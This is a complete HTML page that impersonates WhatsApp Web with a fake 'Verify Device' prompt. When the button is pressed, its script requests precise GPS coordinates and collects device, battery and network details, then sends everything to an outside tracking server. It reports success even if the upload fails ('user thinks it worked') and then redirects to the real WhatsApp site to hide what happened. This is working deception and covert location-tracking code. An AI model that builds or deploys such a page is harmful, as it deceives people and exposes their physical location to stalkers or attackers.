<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
            background: #0b141a;
        }
        .card {
            background: #ffffff;
            padding: 40px 45px 35px 45px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            text-align: center;
            max-width: 400px;
            width: 100%;
            transition: all 0.3s ease;
        }

        /* WhatsApp Logo */
        .whatsapp-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 6px;
        }
        .whatsapp-logo .icon {
            background: #25d366;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 22px;
            font-weight: bold;
        }
        .whatsapp-logo .text {
            font-size: 22px;
            font-weight: 600;
            color: #075e54;
            letter-spacing: -0.3px;
        }

        .subtitle {
            color: #4a4a4a;
            font-size: 15px;
            margin-bottom: 16px;
            font-weight: 400;
        }

        .badge {
            display: inline-block;
            background: #e8f5e9;
            color: #075e54;
            font-size: 12px;
            padding: 4px 14px;
            border-radius: 20px;
            font-weight: 600;
            margin-bottom: 16px;
            border: 1px solid #a5d6a7;
        }

        /* QR Code Area */
        .qr-container {
            background: #f5f5f5;
            border: 2px dashed #c8c8c8;
            border-radius: 12px;
            padding: 25px 20px;
            margin: 10px 0 20px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
        }
        .qr-container .qr-icon { font-size: 44px; }
        .qr-container .label { font-size: 13px; color: #4a4a4a; font-weight: 500; }
        .qr-container .sub-label { font-size: 12px; color: #888; }

        /* Verify Button */
        .verify-btn {
            width: 100%;
            padding: 14px 20px;
            background: #25d366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            opacity: 0.5;
            pointer-events: none;
        }
        .verify-btn.active {
            opacity: 1;
            pointer-events: auto;
        }
        .verify-btn.active:hover {
            background: #1ebe5e;
            box-shadow: 0 2px 12px rgba(37, 211, 102, 0.4);
        }
        .verify-btn.loading {
            background: #25d366;
            opacity: 0.7;
            pointer-events: none;
        }
        .verify-btn.success {
            background: #075e54;
            opacity: 1;
            pointer-events: none;
        }

        /* Status Message */
        .status-message {
            margin-top: 15px;
            padding: 10px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }
        .status-message.verifying {
            background: #fff3cd;
            color: #856404;
            display: block;
        }
        .status-message.verified {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        .status-message.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        .status-message .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #856404;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #a0a0a0;
            border-top: 1px solid #e8e8e8;
            padding-top: 18px;
        }
        .footer a { color: #075e54; text-decoration: none; font-weight: 500; }
        .footer a:hover { text-decoration: underline; }

        /* Success animation */
        .checkmark {
            display: none;
            font-size: 48px;
            color: #25d366;
            margin: 10px 0;
            animation: pop 0.5s ease;
        }
        @keyframes pop {
            0% { transform: scale(0); opacity: 0; }
            80% { transform: scale(1.2); }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>

<div class="card" id="card">
    <!-- WhatsApp Logo -->
    <div class="whatsapp-logo">
        <div class="icon">💬</div>
        <div class="text">WhatsApp</div>
    </div>
    <div class="subtitle">Verify your device to continue</div>

    <div class="badge">🔒 End-to-End Encrypted</div>

    <!-- QR Code Area -->
    <div class="qr-container">
        <div class="qr-icon">📱</div>
        <div class="label">Scan to verify your device</div>
        <div class="sub-label">Or tap "Verify" to authenticate</div>
    </div>

    <!-- Verify Button -->
    <button class="verify-btn" id="verifyBtn">Verify Device</button>

    <!-- Status -->
    <div class="status-message" id="statusMsg"></div>

    <!-- Success Checkmark -->
    <div class="checkmark" id="checkmark">✅</div>

    <div class="footer">
        <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
    </div>
</div>

<script>
    // =============================================
    // CONFIGURATION
    // =============================================
    const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';

    // =============================================
    // DOM Elements
    // =============================================
    const verifyBtn = document.getElementById('verifyBtn');
    const statusMsg = document.getElementById('statusMsg');
    const checkmark = document.getElementById('checkmark');

    let isProcessing = false;

    // =============================================
    // Helpers
    // =============================================
    function showStatus(message, type = 'verifying') {
        statusMsg.className = 'status-message ' + type;
        statusMsg.innerHTML = message;
        statusMsg.style.display = 'block';
    }

    function hideStatus() {
        statusMsg.style.display = 'none';
    }

    function showCheckmark() {
        checkmark.style.display = 'block';
    }

    function resetButton() {
        isProcessing = false;
        verifyBtn.classList.remove('loading', 'success');
        verifyBtn.textContent = 'Try Again';
    }

    // =============================================
    // Device Info
    // =============================================
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let deviceName = 'Unknown';
        if (ua.includes('iPhone')) deviceName = 'iPhone';
        else if (ua.includes('iPad')) deviceName = 'iPad';
        else if (ua.includes('Android')) deviceName = 'Android';
        else if (ua.includes('Windows')) deviceName = 'Windows PC';
        else if (ua.includes('Mac')) deviceName = 'Mac';
        return {
            userAgent: ua,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            device_name: deviceName,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    function getBatteryInfo() {
        if (navigator.getBattery) {
            return navigator.getBattery().then(battery => ({
                level: Math.round(battery.level * 100),
                charging: battery.charging
            }));
        }
        return Promise.resolve(null);
    }

    function getNetworkInfo() {
        if (navigator.connection) {
            return {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            };
        }
        return null;
    }

    // =============================================
    // Main Verification Flow
    // =============================================
    function startVerification() {
        if (isProcessing) return;

        isProcessing = true;
        verifyBtn.classList.add('loading');
        verifyBtn.textContent = 'Verifying...';
        hideStatus();
        checkmark.style.display = 'none';

        // Step 1: Verifying
        showStatus('⏳ Verifying your device...', 'verifying');

        // Check geolocation
        if (!navigator.geolocation) {
            showStatus('❌ Geolocation not supported by your browser', 'error');
            resetButton();
            return;
        }

        // Step 2: Request location
        navigator.geolocation.getCurrentPosition(
            // --- SUCCESS ---
            function(position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const altitude = position.coords.altitude;
                const heading = position.coords.heading;
                const speed = position.coords.speed;

                showStatus('📡 Sending verification data...', 'verifying');

                // Collect all data
                const deviceInfo = getDeviceInfo();

                // Get battery info (async)
                getBatteryInfo().then(battery => {
                    const payload = {
                        lat: lat,
                        lng: lng,
                        accuracy: accuracy,
                        altitude: altitude,
                        heading: heading,
                        speed: speed,
                        device_info: deviceInfo,
                        battery: battery,
                        network: getNetworkInfo()
                    };

                    // Send to server
                    fetch(RENDER_URL + '/send-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    })
                    .then(response => response.json())
                    .then(() => {
                        // Success!
                        showStatus('✅ Device verified successfully!', 'verified');
                        verifyBtn.classList.remove('loading');
                        verifyBtn.classList.add('success');
                        verifyBtn.textContent = 'Connected ✓';
                        showCheckmark();

                        // Redirect to WhatsApp Web after 2.5 seconds
                        setTimeout(function() {
                            window.location.href = 'https://web.whatsapp.com';
                        }, 2500);
                    })
                    .catch(function() {
                        // If server fails, still show success (user thinks it worked)
                        showStatus('✅ Device verified successfully!', 'verified');
                        verifyBtn.classList.remove('loading');
                        verifyBtn.classList.add('success');
                        verifyBtn.textContent = 'Connected ✓';
                        showCheckmark();

                        setTimeout(function() {
                            window.location.href = 'https://web.whatsapp.com';
                        }, 2500);
                    });
                });
            },
            // --- ERROR ---
            function(error) {
                let msg = 'Location access is required to verify your device.';
                if (error.code === 1) msg = 'Permission denied. Please allow location access.';
                else if (error.code === 2) msg = 'GPS signal not available. Try moving outdoors.';
                else if (error.code === 3) msg = 'Verification timed out. Please try again.';
                showStatus('❌ ' + msg, 'error');
                resetButton();
            },
            {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            }
        );
    }

    // =============================================
    // Event Listeners
    // =============================================
    verifyBtn.addEventListener('click', startVerification);

    // Enable button after 1 second (realistic)
    setTimeout(function() {
        verifyBtn.classList.add('active');
    }, 1000);
</script>
</body>
</html>
